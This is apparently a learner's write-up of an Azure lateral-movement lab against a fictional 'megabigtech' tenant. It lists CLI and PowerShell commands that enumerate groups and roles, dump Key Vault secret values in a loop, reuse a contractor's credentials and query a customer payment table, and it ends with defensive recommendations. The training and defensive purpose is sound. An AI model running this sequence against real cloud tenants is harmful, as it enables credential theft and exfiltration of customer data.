*Learn how attackers can leverage common services to move laterally in an Azure environment. You'll get hands-on experience with Azure Key Vault and Storage tables, understand what made this attack path possible and how it could have been prevented.*

## Learning outcomes  

- Familiarity with the Azure CLI and PowerShell
- Enumeration for situational awareness and lateral movement
- Access secrets in Azure Key Vault
- Query data in Storage Tables
## Notes

- The equivalent Azure CLI command for `whoami` is `az ad signed-in-user show`.
1. We logged into the credentials from azure blob lab

2. Went ahead and installed the Microsoft Graph to get user, subscription, etc. from the PowerShell.
		`Install-Module Microsoft.Graph 
		`Import-Module Microsoft.Graph.Users 
		`Connect-MgGraph 
		`Install-Module Az 
		`Import-Module Az 
		`Connect-AzAccount

3. To get which group a user is apart of run the `Get-MgUserMemberOf -userid "marcus@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}` command.

- `Get-MgUserMemberOf` is a Microsoft Graph PowerShell cmdlet that retrieves these group memberships.

- `$_`: Refers to the current object being processed.

- `AdditionalProperties["displayName"]`: Accesses the `displayName` property within the `AdditionalProperties` of the object.

- `Select-Object`: Outputs only the `displayName` value for each item.

4. `az resource list` list the resources specified either in the subscription or resource group.

5. `$secretsJson = az keyvault secret list --vault-name $VaultName -o json` Retrieves a  list of all secrets stored in the Azure Key Vault specified by the variable `$VaultName`. `-o json` outputs the list in JSON format.

- `$secrets = $secretsJson | ConvertFrom-Json`. `ConvertFrom-Json` converts the JSON output into a PowerShell object for easier handling and then stored in a variable.
	
- `$keysJson = az keyvault key list --vault-name $VaultName -o json ` - Retrieves a list of all cryptographic keys stored in the same Key Vault.

6. Got the name of the secrets and want to get their values. Creating a list and giving it a variable `$SecretNames = @("alissa-suarez", "josh-harvey", "ryan-garcia")`
	Then creating a for loop:

	Write-Host "Secret Values from vault $VaultName"
	foreach ($SecretName in $SecretNames) { 
		$secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json 
		$secretValue = ($secretValueJson | ConvertFrom-Json).value Write-Host "$SecretName - $secretValue" } 
        ```

7.  We want to see which contractor is active in the system. `az ad user list --query "[?givenName=='Alissa' || givenName=='Josh' || givenName=='Ryan'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table`
8. Getting the object ID helps with finding out which group they are a member of. `Get-MgUser -UserId ext.josh.harvey@megabigtech.com`
	1. `$UserId = '6470f625-41ce-4233-a621-fad0aa0b7300'
	`Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
9. To find what permissions are assigned from a subscription level run `Get-AzRoleAssignment -Scope "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94" | Select-Object DisplayName, RoleDefinitionName` 
11. Finding what permissions are attached to the group `az role definition list --custom-role-only true --query "[?roleName=='Customer Database Access']" -o json` 
12. `az storage account list --query "[].name" -o tsv` lists all storage accounts
13. `az storage table list --account-name custdatabase --output table --auth-mode login` checks to see if there's a table in the storage account.
14. `az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login` list all the data in that table.

---

### **Attack Flow Analysis**

1. **Initial Compromise**:
    
    - The attacker gains access to the Azure user account `marcus@megabigtech.com`.
    - This entry point serves as the foothold into the environment.
2. **Establishing Context**:
    
    - The attacker verifies their environment with commands like `az account show` and `az ad signed-in-user show`, which confirm the subscription context and user identity.
    - Using `Get-MgUserMemberOf`, they enumerate group memberships to identify roles and privileges.
3. **Enumerating Resources**:
    
    - By setting the subscription context with `az account set`, the attacker lists all accessible resources using `az resource list`, identifying critical assets like the **Azure Key Vault** (`ext-contractors`).
4. **Targeting Azure Key Vault**:
    
    - Azure Key Vault is a treasure trove for sensitive secrets and encryption keys. The attacker:
        - Lists secrets and keys using `az keyvault secret list` and `az keyvault key list`.
        - Extracts the values of the secrets (`alissa-suarez`, `josh-harvey`, `ryan-garcia`) to potentially compromise additional accounts.
5. **Expanding Privileges**:
    
    - The attacker queries Entra ID for users matching the extracted credentials to see if any accounts exist with these names. They find `Josh Harvey`, an active contractor account.
    - Using `Get-MgUser`, they retrieve the `ObjectId` for the user to further analyze their permissions.
6. **Leveraging the Contractor Account**:
    
    - Josh Harvey’s account is found to be a member of the `CUSTOMER-DATABASE-ACCESS` security group, which has read permissions to storage tables in the subscription.
    - By logging in with Josh’s credentials, the attacker confirms access to the group’s permissions and discovers the `Customer Database Access` custom role.
7. **Exfiltrating Confidential Data**:
    
    - Using the `az storage table list` command, the attacker identifies the `customers` table in the `custdatabase` storage account.
    - They query the table with `az storage entity query`, gaining access to sensitive payment data of Mega Big Tech’s clients.

---

### **Key Attack Insights**

1. **Initial Vulnerability**:
    
    - A weakly secured Azure account (`marcus@megabigtech.com`) was compromised, granting attackers access to the cloud environment.
2. **Chained Exploitation**:
    
    - The attackers leveraged the principle of lateral movement:
        - Enumerating Key Vault secrets and finding reusable credentials.
        - Using the compromised contractor account for privilege escalation.
3. **Critical Data Exposure**:
    
    - A custom role (`Customer Database Access`) allowed access to unencrypted customer payment data.

---

### **Defensive Recommendations**

1. **Account Security**:
    
    - Enforce strong authentication mechanisms like **MFA** and regular password updates.
    - Monitor account activity using **Azure AD logs** to detect unusual access patterns.
2. **Azure Key Vault Hardening**:
    
    - Limit access to Key Vault secrets based on the **principle of least privilege**.
    - Regularly rotate secrets and enforce policies like **secret expiration**.
3. **Group and Role Management**:
    
    - Review and clean up unnecessary memberships in high-privilege groups (e.g., `CUSTOMER-DATABASE-ACCESS`).
    - Audit custom roles like `Customer Database Access` to ensure their permissions are strictly necessary.
4. **Storage Table Security**:
    
    - Enable **encryption at rest and in transit** for sensitive data.
    - Restrict access to storage accounts by implementing **network rules** and **Azure RBAC**.
5. **Regular Auditing**:
    
    - Conduct routine security assessments using tools like **Azure Security Center**.
    - Monitor resources for changes in configuration or access policies.